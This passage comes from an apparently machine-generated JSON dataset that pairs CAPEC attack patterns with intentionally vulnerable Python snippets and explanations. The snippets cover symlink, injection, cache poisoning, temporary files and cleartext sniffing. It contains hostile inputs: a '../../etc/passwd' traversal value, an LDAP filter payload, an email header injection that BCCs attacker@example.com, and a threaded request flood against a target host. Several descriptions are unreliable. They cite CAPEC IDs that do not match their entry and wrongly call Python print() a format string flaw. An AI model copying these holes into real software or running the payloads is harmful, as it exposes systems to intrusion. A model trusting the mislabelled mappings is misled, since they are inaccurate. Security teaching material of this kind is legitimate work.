        "description": "This Python code snippet demonstrates a resource leak vulnerability by improperly releasing a lock resource. The `Resource` class manages a list with thread synchronization using a lock. The `add_data` method acquires the lock but fails to release it, simulating an improper resource shutdown or release (CWE-404). This can lead to resource depletion, as the lock is never released, preventing other threads from accessing the resource. The `get_data` method correctly acquires and releases the lock, but due to the improper release in `add_data`, it may never get a chance to execute properly. This embodies the main idea of the CAPEC by showing how resource leaks can deplete available resources for legitimate requests."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import os\n\n# Function to read a file's content\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        print(f\"Error reading file: {e}\")\n\n# User input for file path\nuser_input = input(\"Enter the file path: \")\n\n# Read the file content\nfile_content = read_file(user_input)\nif file_content:\n    print(file_content)\n",
        "description": "This Python code snippet demonstrates a potential vulnerability to a Symlink Attack. The function `read_file` takes a file path as input and attempts to read its content. The file path is provided by user input, which is not validated or sanitized. This can lead to several issues described by the related CWEs:\n\n1. **Improper Link Resolution Before File Access (CWE-59)**: The code does not check if the provided file path is a symbolic link, which could point to an unintended resource.\n2. **UNIX Symbolic Link (Symlink) Following (CWE-61)**: The code does not account for symbolic links that resolve to targets outside the intended control sphere.\n3. **UNIX Hard Link (CWE-62)**: Similar to symbolic links, the code does not handle hard links that could point to unauthorized files.\n4. **External Control of File Name or Path (CWE-73)**: The file path is directly influenced by user input, allowing an attacker to specify arbitrary paths.\n5. **Race Condition Enabling Link Following (CWE-363)**: The code does not check the file's status before accessing it, which could lead to a race condition where the file is replaced with a link before access.\n\nOverall, this code snippet represents the main idea of a Symlink Attack by showing how an application can be tricked into accessing unintended files through improper handling of file paths and links."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import argparse\n\n# Hidden functionality not documented\ndef hidden_debug_mode():\n    print(\"Debugging information: Sensitive data exposed!\")\n\n# Main application functionality\ndef main():\n    parser = argparse.ArgumentParser(description='Sample Application')\n    parser.add_argument('--debug', action='store_true', help='Enable debug mode')\n    args = parser.parse_args()\n\n    if args.debug:\n        hidden_debug_mode()\n    else:\n        print(\"Normal operation\")\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simple command-line application that includes a hidden debug mode. The hidden_debug_mode function, which is not documented or intended for regular users, prints sensitive debugging information. The main function uses argparse to parse command-line arguments and checks if the --debug switch is provided. If the --debug switch is used, the hidden_debug_mode function is invoked, exposing sensitive information. This code embodies the CAPEC 'Try All Common Switches' by showing how an attacker might discover and exploit undocumented functionality (--debug switch) to reveal sensitive information. The related CWEs are represented by the hidden functionality (CWE-912), the incomplete list of disallowed inputs (CWE-184), and the unchecked error condition (CWE-391) in the context of the debug mode."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send email\ndef send_email(to_address, subject, body):\n    from_address = 'sender@example.com'\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # SMTP server configuration\n    smtp_server = 'smtp.example.com'\n    smtp_port = 587\n\n    # Establish connection to the SMTP server\n    server = smtplib.SMTP(smtp_server, smtp_port)\n    server.starttls()\n    server.login('username', 'password')\n\n    # Send the email\n    server.sendmail(from_address, [to_address], msg.as_string())\n    server.quit()\n\n# Example usage\nuser_input = \"victim@example.com\\nBCC: attacker@example.com\"\nsend_email(user_input, 'Test Subject', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that is susceptible to email injection attacks. The function `send_email` takes user input for the recipient's email address (`to_address`), subject, and body of the email. The user input is directly used to construct the email headers without proper neutralization or validation. This allows an attacker to inject additional email headers by including newline characters (\\n) in the `to_address` input, potentially adding a BCC recipient or modifying other headers. This vulnerability is related to several CWEs, including improper neutralization of escape sequences, input terminators, and special elements."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    print(user_input)\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a string: \")\n    vulnerable_function(user_input)\n",
        "description": "This Python code snippet demonstrates a format string injection vulnerability. The `vulnerable_function` takes `user_input` as an argument and directly passes it to the `print` function without any validation or sanitization. This embodies the main idea of CAPEC-121: Format String Injection, where an adversary can include formatting characters in the input string. The related CWE-134 (Use of Externally-Controlled Format String) is represented here as the format string originates from an external source (user input). The lack of input validation (CWE-20) and improper neutralization of special elements (CWE-74) are also evident in this code, making it susceptible to potential exploitation."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\n# Establish a connection to the LDAP server\nconn = ldap.initialize('ldap://localhost')\n\n# User input (potentially malicious)\nuser_input = \"admin*)(|(userPassword=*))\"\n\n# Constructing the LDAP query without proper input validation\nldap_query = f\"(uid={user_input})\"\n\n# Perform the search\ntry:\n    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_query)\n    for dn, entry in result:\n        print(f\"Found entry: {dn}\")\nexcept ldap.LDAPError as e:\n    print(f\"LDAP search failed: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerable LDAP query construction that is susceptible to LDAP Injection. The code initializes a connection to an LDAP server and constructs an LDAP query using user input without proper validation or neutralization of special characters. The user input is directly embedded into the LDAP query, which can be exploited by an attacker to manipulate the query and potentially retrieve unauthorized information. This example highlights the importance of proper input validation and neutralization to prevent injection attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable code: directly using user input in a URL\n    url = f'http://example.com/search?query={query}'\n    # Simulate a request to the constructed URL\n    response = simulate_request(url)\n    return response\n\ndef simulate_request(url):\n    # This function simulates making a request to the constructed URL\n    return f'Request made to: {url}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a single route '/search' that accepts a GET request with a 'query' parameter. The user input is directly used to construct a URL for an external request without proper sanitization or encoding. This can lead to parameter injection attacks, where an attacker can manipulate the 'query' parameter to inject additional parameters or modify the request. For example, if the user provides 'myInput&new_param=myValue' as the query, the constructed URL will be 'http://example.com/search?query=myInput&new_param=myValue', potentially altering the server's behavior. This snippet embodies the main idea of CAPEC-137 (Parameter Injection) and highlights related CWEs such as CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import importlib\n\n# Simulate external input\nuser_input = 'os'\n\n# Unsafe reflection based on user input\ntry:\n    module = importlib.import_module(user_input)\n    print(f'Module {user_input} loaded successfully.')\n    # Attempt to use a function from the loaded module\n    if hasattr(module, 'system'):\n        module.system('echo Hello World')\nexcept ImportError:\n    print(f'Failed to load module {user_input}')",
        "description": "This Python code snippet demonstrates a reflection injection vulnerability. The code uses the `importlib` library to dynamically import a module based on user input. If the user input is 'os', the code will import the 'os' module and then use the `system` function to execute a command. This is dangerous because it allows an attacker to control which module is imported and potentially execute arbitrary commands. This snippet embodies the main idea of the CAPEC by showing how an adversary can supply a value that is used by reflection methods to identify and invoke classes or methods, leading to potential security risks such as command injection (CWE-77) and code injection (CWE-94)."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/html'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a relative path traversal vulnerability. The function `read_file` takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/html`). The code does not properly validate or sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. In the example usage, the user input `../../etc/passwd` is used to attempt to read the system's password file, which is a common target in path traversal attacks. This code embodies the main idea of the CAPEC by showing how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "from flask import Flask, request, redirect, url_for, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if request.method == 'POST':\n        session['form1_data'] = request.form['data']\n        return redirect(url_for('form2'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if 'form1_data' not in session:\n        return redirect(url_for('form1'))\n    if request.method == 'POST':\n        session['form2_data'] = request.form['data']\n        return redirect(url_for('form3'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if 'form2_data' not in session:\n        return redirect(url_for('form2'))\n    if request.method == 'POST':\n        session['form3_data'] = request.form['data']\n        return 'All forms completed!'\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a multi-step form submission process. The application consists of three forms (`form1`, `form2`, and `form3`). Each form saves its data in the session and redirects the user to the next form. The code checks if the required data from the previous form is present in the session before allowing access to the next form. This is intended to prevent users from skipping forms. However, the code is vulnerable to several issues: \n1. **Incomplete Internal State Distinction (CWE-372)**: The application does not properly manage the state of the form sequence, relying solely on session variables without robust validation.\n2. **External Control of Assumed-Immutable Web Parameter (CWE-472)**: The session data can be manipulated by an attacker if they have access to the session storage.\n3. **Authorization Bypass Through User-Controlled Key (CWE-639)**: The session keys used to store form data can be tampered with, potentially allowing unauthorized access to different stages of the form.\n4. **Reliance on Untrusted Inputs in a Security Decision (CWE-807)**: The application relies on session data, which can be untrusted, to make security decisions about form progression.\n5. **Cross-Site Request Forgery (CSRF) (CWE-352)**: The application does not implement CSRF protection, making it vulnerable to CSRF attacks."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\n\nclass Cache:\n    def __init__(self):\n        self.cache = {}\n\n    def get_data(self, url):\n        if url in self.cache:\n            return self.cache[url]\n        response = requests.get(url)\n        if response.status_code == 200:\n            self.cache[url] = response.text\n            return response.text\n        return None\n\n# Simulating a less trusted source\ntrusted_url = 'https://trusted-source.com/data'\nuntrusted_url = 'http://untrusted-source.com/data'\n\ncache = Cache()\n\n# Fetching data from a less trusted source\nprint(cache.get_data(untrusted_url))\n\n# Fetching data from a trusted source\nprint(cache.get_data(trusted_url))",
        "description": "This Python code snippet demonstrates a simple caching mechanism that can be exploited for cache poisoning. The `Cache` class stores responses from URLs in a dictionary. When `get_data` is called, it first checks if the URL is already in the cache. If not, it fetches the data from the URL and stores it in the cache. The code does not verify the authenticity of the data or the source, making it vulnerable to cache poisoning attacks. An attacker could exploit this by providing a malicious URL (untrusted source) that gets cached and served to users, leading to potential security risks. This example embodies the main idea of CAPEC-153 (Cache Poisoning) and highlights related CWEs such as insufficient verification of data authenticity (CWE-345) and use of less trusted sources (CWE-348)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import socket\n\ndef get_ip_from_hostname(hostname):\n    try:\n        # Perform DNS resolution\n        ip_address = socket.gethostbyname(hostname)\n        return ip_address\n    except socket.gaierror:\n        return None\n\ndef vulnerable_dns_cache_poisoning(hostname):\n    # Simulate a DNS cache poisoning scenario\n    poisoned_cache = {\n        'www.example.com': '1.2.3.4',  # Malicious IP address\n    }\n    \n    # Check if the hostname is in the poisoned cache\n    if hostname in poisoned_cache:\n        return poisoned_cache[hostname]\n    else:\n        return get_ip_from_hostname(hostname)\n\n# Example usage\nhostname = 'www.example.com'\nip_address = vulnerable_dns_cache_poisoning(hostname)\nprint(f'The IP address for {hostname} is {ip_address}')",
        "description": "This Python code snippet demonstrates a simplified version of DNS cache poisoning. The `vulnerable_dns_cache_poisoning` function first checks if the hostname is in a simulated poisoned cache. If it is, it returns the malicious IP address from the cache. Otherwise, it performs a normal DNS resolution using `socket.gethostbyname`. This code embodies the main idea of DNS cache poisoning by showing how an adversary can manipulate DNS cache to redirect traffic to a malicious IP address. The related CWEs are represented by the lack of verification of data authenticity and the acceptance of untrusted data (the poisoned cache) as if it were trusted."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\nfrom flask import Flask, send_from_directory, request, abort\n\napp = Flask(__name__)\n\n# CWE-219: Storing sensitive data under web root\nSENSITIVE_DIR = 'sensitive_data'\n\n@app.route('/<path:filename>', methods=['GET'])\ndef download_file(filename):\n    # CWE-425: Direct Request ('Forced Browsing')\n    if not request.args.get('auth_token'):\n        abort(403)  # Forbidden\n    try:\n        # CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        if filename.startswith('.git'):\n            abort(403)  # Forbidden\n        # CWE-612: Improper Authorization of Index Containing Sensitive Information\n        if filename == 'index.html':\n            abort(403)  # Forbidden\n        return send_from_directory(SENSITIVE_DIR, filename)\n    except FileNotFoundError:\n        abort(404)  # Not Found\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that serves files from a directory named 'sensitive_data' under the web root. The code demonstrates several vulnerabilities: \n1. CWE-219: Sensitive data is stored under the web root, making it potentially accessible to unauthorized users.\n2. CWE-425: The application does not enforce proper authorization checks, allowing direct requests to potentially sensitive files.\n3. CWE-527: The code does not prevent access to version control directories (e.g., '.git'), which could expose sensitive repository information.\n4. CWE-612: The code does not properly restrict access to an index file ('index.html'), which could contain sensitive information.\nThe code attempts to mitigate some of these issues by checking for an 'auth_token' query parameter and blocking access to '.git' and 'index.html', but these measures are insufficient and highlight the vulnerabilities described in the CAPEC."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import requests\n\n# URL of the unpublicized web service\nurl = 'http://example.com/hidden_service'\n\n# Attempt to access the unpublicized web service\nresponse = requests.get(url)\n\nif response.status_code == 200:\n    print('Accessed unpublicized web service successfully!')\n    print('Response:', response.text)\nelse:\n    print('Failed to access the unpublicized web service.')",
        "description": "This Python code snippet demonstrates an attempt to access an unpublicized web service, which is the main idea of the CAPEC 'Detect Unpublicized Web Services'. The code uses the 'requests' library to send a GET request to a URL that represents an unpublicized web service. If the service is accessible (HTTP status code 200), it prints the response, indicating that the service is reachable despite not being publicized. This scenario can be dangerous as such services may lack adequate security controls. The code embodies CWE-425 (Direct Request) by directly accessing a potentially restricted URL, CWE-651 (Exposure of WSDL File) by potentially exposing sensitive information if the service returns such data, and CWE-223 (Omission of Security-relevant Information) by not logging or handling the access attempt securely."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\n# Simulate sending a message with a checksum\nmessage = \"Important data\"\nchecksum = hashlib.md5(message.encode()).hexdigest()\n\n# Simulate an adversary modifying the message and checksum\nmodified_message = \"Tampered data\"\nspoofed_checksum = hashlib.md5(modified_message.encode()).hexdigest()\n\n# Simulate the recipient verifying the message\nreceived_message = modified_message\nreceived_checksum = spoofed_checksum\n\n# Improper validation: only checks if checksums match\nif hashlib.md5(received_message.encode()).hexdigest() == received_checksum:\n    print(\"Message integrity verified.\")\nelse:\n    print(\"Message integrity compromised.\")",
        "description": "This Python code snippet demonstrates a vulnerability related to checksum spoofing. The original message and its checksum are generated using the MD5 hash function. An adversary then modifies the message and generates a new checksum for the tampered message. The recipient improperly validates the message by only checking if the checksums match, without ensuring the integrity of the original message. This represents CWE-354 (Improper Validation of Integrity Check Value) and CWE-328 (Use of Weak Hash), as MD5 is a weak hash function susceptible to collision attacks. The code highlights the risk of checksum spoofing where an adversary can alter the message and its checksum, making the tampered message appear legitimate."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that processes XML data\n\ndef process_xml(xml_data, schema_data):\n    try:\n        # Parse the XML schema (potentially from an untrusted source)\n        schema_root = ET.fromstring(schema_data)\n        schema = ET.ElementTree(schema_root)\n\n        # Parse the XML data\n        xml_root = ET.fromstring(xml_data)\n        xml_tree = ET.ElementTree(xml_root)\n\n        # Validate XML against the schema (missing validation step)\n        # This is where the validation should occur, but it is omitted\n\n        # Process the XML data\n        for elem in xml_tree.iter():\n            print(elem.tag, elem.text)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Example usage\nxml_data = \"\"\"<data><item>Example</item></data>\"\"\"\nschema_data = \"\"\"<xs:schema xmlns:xs='http://www.w3.org/2001/XMLSchema'>\n<xs:element name='data'>\n  <xs:complexType>\n    <xs:sequence>\n      <xs:element name='item' type='xs:string'/>\n    </xs:sequence>\n  </xs:complexType>\n</xs:element>\n</xs:schema>\"\"\"\n\nprocess_xml(xml_data, schema_data)",
        "description": "This Python code snippet demonstrates a vulnerable function `process_xml` that processes XML data based on a provided XML schema. The function takes two inputs: `xml_data` and `schema_data`. The schema data is parsed and used to validate the XML data. However, the validation step is missing, which is a critical security flaw (CWE-112: Missing XML Validation). This omission allows an attacker to manipulate the schema (CAPEC: XML Schema Poisoning) and potentially inject malicious XML content (CWE-91: XML Injection). The code also highlights the risk of external control over system settings or configuration (CWE-15) and the improper neutralization of data within XPath expressions (CWE-643)."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import requests\nimport threading\n\n# Function to send a SOAP request\ndef send_soap_request(url, xml_payload):\n    headers = {'Content-Type': 'text/xml'}\n    try:\n        response = requests.post(url, data=xml_payload, headers=headers)\n        print(f'Response Code: {response.status_code}')\n    except requests.exceptions.RequestException as e:\n        print(f'Request failed: {e}')\n\n# XML payload (small but complex enough to require processing)\nxml_payload = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.org/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Request>\n         <web:Data>Some data</web:Data>\n      </web:Request>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Target URL\nurl = 'http://target.example.com/soap'\n\n# Number of threads to simulate rapid requests\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=send_soap_request, args=(url, xml_payload))\n    threads.append(thread)\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a resource depletion attack, specifically an 'XML Ping of the Death' attack. The code sends a large number of small but complex SOAP XML messages to a target URL in rapid succession using multithreading. Each thread sends a SOAP request with a predefined XML payload to the target server. The rapid and repeated sending of these requests can cause the target server to exhaust its resources, leading to a denial of service or crash. This attack leverages CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any limits on the number of requests sent. The XML payload is not validated against a schema, relating to CWE-112 (Missing XML Validation)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['GET'])\ndef fetch_content():\n    url = request.args.get('url')\n    if not url:\n        return 'URL parameter is missing', 400\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return render_template_string(response.text)\n        else:\n            return 'Failed to fetch content', 500\n    except requests.RequestException as e:\n        return f'Error fetching content: {e}', 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that fetches and displays content from a URL provided as a query parameter. The main idea of the CAPEC (Content Spoofing) is embodied here by the potential for an adversary to manipulate the content fetched from the specified URL. The code does not verify the authenticity of the fetched data (CWE-345), does not ensure message integrity during transmission (CWE-924), and directly renders the fetched content without parsing or sanitizing it (CWE-433). This can lead to content spoofing, where an attacker could serve malicious content to users. Additionally, the lack of proper validation of the URL parameter can lead to incorrect destinations being specified (CWE-941)."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file with a predictable name\npredictable_temp_file = '/tmp/tempfile_1234.txt'\n\n# Open the temporary file without secure permissions\nwith open(predictable_temp_file, 'w') as temp_file:\n    temp_file.write('Sensitive data')\n\n# Print the path of the temporary file\nprint(f'Temporary file created at: {predictable_temp_file}')",
        "description": "This Python code snippet demonstrates the creation of a temporary file with a predictable name in an insecure manner. The file is created in the '/tmp' directory with a hardcoded name 'tempfile_1234.txt'. This approach embodies the main idea of the CAPEC 'Explore for Predictable Temporary File Names' by showing how an attacker could predict the name and location of temporary files. The code also highlights related CWEs such as CWE-377 (Insecure Temporary File), CWE-378 (Creation of Temporary File With Insecure Permissions), and CWE-379 (Creation of Temporary File in Directory with Insecure Permissions). The temporary file is created without any security measures, making it vulnerable to attacks like information gathering and symlink attacks."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# Example of a sensitive configuration file path\nconfig_file_path = '/etc/myapp/config.txt'\n\n# Function to read the configuration file\n# This function does not check for proper permissions or access control\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-1330: Remanent Data Readable after Memory Erase\n\ndef read_config_file(path):\n    try:\n        with open(path, 'r') as file:\n            data = file.read()\n            return data\n    except FileNotFoundError:\n        return 'Configuration file not found.'\n    except PermissionError:\n        return 'Permission denied.'\n\n# Function to clear sensitive data from the configuration file\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n\ndef clear_sensitive_data(path):\n    try:\n        with open(path, 'w') as file:\n            file.write('')  # Improper clearing of sensitive data\n    except FileNotFoundError:\n        return 'Configuration file not found.'\n    except PermissionError:\n        return 'Permission denied.'\n\n# Read the configuration file\nconfig_data = read_config_file(config_file_path)\nprint(config_data)\n\n# Clear the sensitive data (improperly)\nclear_sensitive_data(config_file_path)\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit well-known locations for resources, such as configuration files stored in the '/etc' directory on Unix systems. The 'read_config_file' function reads a configuration file without proper permission checks, making it accessible to unauthorized actors (CWE-552). The 'clear_sensitive_data' function attempts to clear sensitive data from the configuration file but does so improperly by simply writing an empty string, which may leave remanent data readable (CWE-1330) and does not ensure sensitive information is fully cleared before state transitions (CWE-1272). This code embodies the main idea of CAPEC-168 by highlighting the risks associated with common resource locations and improper handling of sensitive data."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Simulated login attempt\nusername_input = 'user1'\npassword_input = 'password'\n\nif authenticate(username_input, password_input):\n    print('Authentication successful!')\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates a simple authentication mechanism that is vulnerable to identity spoofing. The code uses MD5 hashing for password storage and verification, which is considered weak and susceptible to various attacks (CWE-1390). The authentication function checks if the provided username exists in the user database and if the hashed password matches the stored hash. However, this approach does not sufficiently prove the claimed identity, making it vulnerable to spoofing attacks (CWE-287, CWE-290). Additionally, the use of MD5 for hashing passwords is insecure and can be easily compromised, further exacerbating the vulnerability."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import re\n\ndef process_user_input(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError(\"Input must be a string\")\n\n    # CWE-1286: Improper Validation of Syntactic Correctness of Input\n    if not re.match(r'^[a-zA-Z0-9_]+$', user_input):\n        raise ValueError(\"Input contains invalid characters\")\n\n    # CWE-807: Reliance on Untrusted Inputs in a Security Decision\n    if user_input == 'admin':\n        print(\"Access granted to admin panel\")\n    else:\n        print(\"Access denied\")\n\n# Example usage\nuser_input = input(\"Enter your username: \")\nprocess_user_input(user_input)",
        "description": "This Python code snippet demonstrates a function `process_user_input` that processes user input with several validation checks. It embodies the main idea of CAPEC-153: Input Data Manipulation, by showing how improper input validation can lead to security issues. The code includes checks for CWE-20 (Improper Input Validation) by ensuring the input is a string, CWE-1286 (Improper Validation of Syntactic Correctness of Input) by using a regex to validate the input format, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) by making a security decision based on the untrusted input. If the input is 'admin', it grants access to the admin panel, otherwise, it denies access. This demonstrates how an attacker could manipulate input to bypass security mechanisms if proper validation is not enforced."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Simulated user input for resource location\nuser_input_url = 'http://trusted-site.com/resource'\n\n# Vulnerable code: does not verify the source or destination properly\n# An attacker can spoof the URL to redirect to a malicious site\ntry:\n    response = requests.get(user_input_url)\n    if response.status_code == 200:\n        # CWE-451: UI Misrepresentation of Critical Information\n        print('Resource loaded from:', user_input_url)\n        print('Content:', response.text)\n    else:\n        print('Failed to load resource')\nexcept requests.exceptions.RequestException as e:\n    print('Error during request:', e)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to Resource Location Spoofing (CAPEC-160). The code takes a user-provided URL and attempts to fetch a resource from it without proper validation. This can lead to several issues:\n\n1. **CWE-941**: The destination URL is taken directly from user input without validation, allowing an attacker to specify a malicious URL.\n2. **CWE-923**: The code does not ensure that it is communicating with the correct endpoint, potentially allowing communication with a malicious server.\n3. **CWE-940**: The source of the communication is not verified, which could lead to accepting responses from untrusted sources.\n4. **CWE-451**: The user interface misrepresents critical information by displaying content from an unverified source, which could be used in phishing attacks.\n\nThe code snippet highlights the importance of validating and verifying resource locations to prevent spoofing attacks."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: User Passwords')\n    temp_file_path = temp_file.name\n\n# Simulate insecure permissions by setting the file to be world-readable\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate an adversary reading the temporary file\nwith open(temp_file_path, 'r') as file:\n    content = file.read()\n    print(f'Adversary reads: {content}')\n\n# Clean up the temporary file\nos.remove(temp_file_path)",
        "description": "This Python code snippet demonstrates the creation and insecure handling of a temporary file containing sensitive information. The code uses the 'tempfile' module to create a temporary file and writes sensitive data (e.g., user passwords) to it. The file permissions are then set to be world-readable (0o644), simulating insecure permissions. An adversary could potentially read the contents of this file due to the insecure permissions. Finally, the code simulates an adversary reading the file and prints the sensitive information. This example embodies the main idea of CAPEC- Screen Temporary Files for Sensitive Information, and highlights related CWEs such as CWE-377 (Insecure Temporary File) and CWE-378 (Creation of Temporary File With Insecure Permissions)."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import socket\n\n# This code demonstrates a simple client-server communication where sensitive data is transmitted in cleartext.\n# It embodies the idea of a Sniffing Attack (CAPEC-158) by not encrypting the data, making it vulnerable to interception.\n# Related CWEs: CWE-311 (Missing Encryption of Sensitive Data), CWE-319 (Cleartext Transmission of Sensitive Information).\n\n# Server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(1)\nprint('Server listening on port 12345...')\n\nconn, addr = server_socket.accept()\nprint(f'Connection from {addr}')\n\n# Receive sensitive data in cleartext\nreceived_data = conn.recv(1024).decode('utf-8')\nprint(f'Received data: {received_data}')\n\nconn.close()\nserver_socket.close()\n\n# Client code\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('localhost', 12345))\n\n# Send sensitive data in cleartext\nsensitive_data = 'password123'\nclient_socket.send(sensitive_data.encode('utf-8'))\nprint(f'Sent data: {sensitive_data}')\n\nclient_socket.close()",
        "description": "This Python code snippet demonstrates a simple client-server communication where sensitive data (a password) is transmitted in cleartext. The server listens on a specified port and accepts a connection from the client. The client then sends sensitive data ('password123') to the server without any encryption. This setup embodies the concept of a Sniffing Attack (CAPEC-158), where an adversary can intercept the communication between the client and server. The code is vulnerable to CWE-311 (Missing Encryption of Sensitive Data) and CWE-319 (Cleartext Transmission of Sensitive Information), as it does not encrypt the sensitive data before transmission, making it susceptible to interception by unauthorized actors."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
